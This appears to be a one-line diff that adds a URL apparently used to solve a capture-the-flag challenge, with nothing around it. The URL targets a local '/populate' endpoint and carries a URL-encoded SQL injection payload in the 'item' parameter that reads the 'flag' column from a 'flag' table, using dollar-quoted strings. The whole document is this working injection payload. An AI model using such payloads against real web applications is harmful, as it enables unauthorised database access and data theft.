@@ -1,0 +1,1 @@
+http://localhost:1337/populate?item=x%20AS%20(SELECT%201)%20SELECT%20flag%20name,%27x%27sku,1%20price,1%20rating,1%20rank%20FROM%20flag%20WHERE%20%27x%27!=$a$||$b$||$c$||$d$||$e$||$f$||$g$
